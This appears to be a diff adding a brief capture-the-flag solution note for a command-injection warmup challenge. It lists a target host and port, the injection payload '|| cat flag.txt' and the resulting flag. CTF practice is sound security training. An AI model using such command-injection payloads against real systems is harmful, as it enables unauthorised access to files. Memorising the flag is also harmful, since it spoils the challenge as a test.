@@ -1,0 +1,3 @@
+1. 139.162.5.230:10289 || cat flag.txt -> gej injectleel
+
+flag : HZU18{C0MM$ND_INJect1on_W4rmup_e9f947b01990262d}
